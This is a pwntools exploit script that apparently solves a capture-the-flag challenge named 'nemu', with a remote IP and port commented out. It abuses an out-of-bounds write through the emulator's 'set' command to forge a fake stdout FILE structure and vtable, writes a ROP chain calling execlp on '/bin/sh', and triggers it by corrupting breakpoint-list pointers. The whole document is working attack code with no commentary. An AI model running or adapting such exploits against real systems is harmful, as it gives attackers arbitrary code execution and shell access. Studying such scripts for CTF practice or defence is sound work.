#coding:utf8
from pwn import *

sh = process('./nemu')
# sh = remote('47.107.29.210',20269)

free_ = 0x86A3FC0
head = 0x86A3FC8
pmem = 0x6A3B80
free_got = 0x60F020
puts_got = 0x60F038
stdout_ptr = 0x612940

def oob_write4(addr,val):
   sh.sendlineafter('(nemu)','set {} {}'.format(addr - pmem,val))

def write8(addr,val):
   sh.sendlineafter('(nemu)','set {} {}'.format(addr - pmem,val & 0xffffffff))
   sh.sendlineafter('(nemu)','set {} {}'.format(addr + 4 - pmem,val >> 32))


def set_bp(val):
   sh.sendlineafter('(nemu)','w {}'.format(val))

def del_bp(index):
   sh.sendlineafter('(nemu)','d {}'.format(index))

execlp_plt = 0x401870
xchg_eax_ebp = 0x0000000000401c03
pop_rdi = 0x0000000000401bfc
pop_rsi = 0x0000000000407ff9
fake_IO_stdout = pmem
fake_IO_vtable = pmem + 0x200
new_rsp = pmem + 0x208

oob_write4(fake_IO_stdout,0x0FBAD2A84)
oob_write4(fake_IO_stdout+0x88,fake_IO_stdout+0x1000) #_IO_stdfile_1_lock
oob_write4(fake_IO_stdout+0xd8,fake_IO_vtable)
oob_write4(fake_IO_vtable+0x38,xchg_eax_ebp)

binsh_addr = new_rsp + 0x28
#rop
write8(new_rsp,pop_rdi)
write8(new_rsp+8,binsh_addr)
write8(new_rsp+0x10,pop_rsi)
write8(new_rsp+0x18,0)
#write8(new_rsp+0x20,pop_rdx)
#write8(new_rsp+0x28,0)
write8(new_rsp+0x20,execlp_plt)
write8(new_rsp+0x28,u64('/bin/sh\x00'))

#edit free_ variable to stdout_ptr - 0x30 address
oob_write4(free_,stdout_ptr - 0x30)
set_bp(pmem & 0xffffffff)
oob_write4(free_,0)
oob_write4(head,stdout_ptr - 0x8 + 4)
#raw_input()
del_bp(0)

sh.interactive()
